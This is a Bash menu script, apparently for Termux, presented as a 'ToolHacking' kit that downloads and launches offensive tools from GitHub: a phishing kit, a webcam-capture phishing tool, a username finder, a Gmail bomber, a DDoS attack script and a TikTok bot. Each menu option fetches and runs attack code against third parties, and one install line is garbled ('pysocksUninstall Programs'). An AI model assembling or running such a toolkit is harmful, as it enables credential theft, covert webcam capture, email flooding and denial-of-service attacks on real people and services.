clear
mkdir ToolHacking
clear 
echo -e '\033[31;38;1m 
███╗░░░███╗░█████╗░░██████╗████████╗███████╗██████╗░░░░░░████████╗░██████╗░ 
████╗░████║██╔══██╗██╔════╝╚══██╔══╝██╔════╝██╔══██╗░░░░░╚══██╔══╝██╔════╝░ 
██╔████╔██║███████║╚█████╗░░░░██║░░░█████╗░░██████╔╝░░░░░░░░██║░░░██║░░██╗░ 
██║╚██╔╝██║██╔══██║░╚═══██╗░░░██║░░░██╔══╝░░██╔══██╗░░░░░░░░██║░░░██║░░╚██╗ 
██║░╚═╝░██║██║░░██║██████╔╝░░░██║░░░███████╗██║░░██║░░░░░░░░██║░░░╚██████╔╝ 
╚═╝░░░░░╚═╝╚═╝░░╚═╝╚═════╝░░░░╚═╝░░░╚══════╝╚═╝░░╚═╝░░░░░░░░╚═╝░░░░╚═════╝░ 
░░███╗░░░░░░░██╗██╗ 
░████║░░░░░░██╔╝██║ 
██╔██║░░░░░██╔╝░██║ 
╚═╝██║░░░░░███████║ 
███████╗██╗╚════██║ 
╚══════╝╚═╝░░░░░╚═╝ 

 \033[33;3m[</>]\033[Om By Master TG By DONE Join => Group:@ShareToolBuffViewTikTok
 
  \033[33;4mVersion:\033[0m 1.4          \033[33;4mCTRL+C:\033[0m exit          \033[33;4mAuthor:\033[0m Salih.py

\e[37m[1]\e[36m Requirements & Update         \e[37m[2]\e[36m Phishing Tool				
\e[37m[3]\e[36m WebCam Hack                   \e[37m[4]\e[36m User Find					
\e[37m[5]\e[36m Gmail Bomber		  \e[37m[6]\e[36m DDOS Attack			
\e[37m[7]\e[36m How to use ?	          \e[37m[8]\e[36m Uninstall Downloaded Programs 		
\e[37m[9]\e[36m TIKTOK-BOT
'


#Menu Coding


read -p "Transaction number: " islem
if [[ $islem == 1 || $islem == 01 ]]; then
clear

## Requirements 
echo -e "\033[47;31;5m Updating and Installing Requirements...\033[0m"
sleep 5
pkg install git -y
pkg install python python2 -y
pkg install pip pip2 -y
pkg install curl -y
apt update
apt upgrade -y
clear
echo -e "\033[47;3;35m Update Completed...\033[0m"
sleep 3
bash tga.sh


## Phishing Tool
elif [[ $islem == 2 || $islem == 02 ]]; then
clear
echo -e "\033[47;3;35m Installation May Take a Long Time Wait\033[0m"
sleep 3
cd Tools2
git clone https://github.com/htr-tech/zphisher
cd zphisher
bash zphisher.sh

## Webcam Hack
elif [[ $islem == 3 || $islem == 03 ]]; then
clear
echo -e "\033[47;3;35m Installation May Take a Long Time Wait\033[0m"
sleep 3
cd Tools3
git clone https://github.com/techchipnet/CamPhish
cd CamPhish
bash camphish.sh


## Finduser
elif [[ $islem == 4 || $islem == 04 ]]; then
clear
echo -e "\033[47;3;35m Installation May Take a Long Time Wait\033[0m"
sleep 3
cd Tools4
git clone https://github.com/xHak9x/finduser
cd finduser
bash finduser.sh
       

## Gmail Bomber
elif [[ $islem == 5 || $islem == 05 ]]; then
clear
echo -e "\033[47;3;35m Installation May Take a Long Time Wait\033[0m"
sleep 3
cd Tools5
git clone https://github.com/palahsu/MBomb.git
cd MBomb
cd 'MBomb v2'
pip install colorama 
pip install tqdm
python MBomb.py

## DDOS Attack
elif [[ $islem == 6 || $islem == 06 ]]; then
clear
echo -e "\033[47;3;35m Installation May Take a Long Time Wait\033[0m"
sleep 3
cd Tools6
pip3 install requests pysocksUninstall Programs
git clone https://github.com/Leeon123/CC-attack
cd CC-attack
python3 cc.py

## TIKTOK-BOT
elif [[ $islem == 9|| $islem == 09 ]]; then
clear
echo -e "\033[47;3;35m Installation May Take a Long Time Wait\033[0m"
sleep 3
cd Tool9
git clone https://github.com/mastertgtool/TIKTOK-BOT.git
cd TIKTOK-BOT
pip install -r requirements.txt
python bot.py
      
## How to use
elif [[ $islem == 7 || $islem == 07 ]]; then
clear
xdg-open https://pasteio.com/xuCvIkXdNRIB
bash tga.sh

## 
elif [[ $islem == 8 ]]; then
        clear

echo -e "\033[47;3;35m DOWNLOADED PROGRAMS ARE BEING REMOVED...\033[0m"
sleep 3 
rm -rf Tools

bash tga.sh

## Faulty code

else   
	clear
        echo -e '\033[36;40;1m You Entered Incorrect Code'	
	sleep 1
	clear 
	bash tga.sh
fi
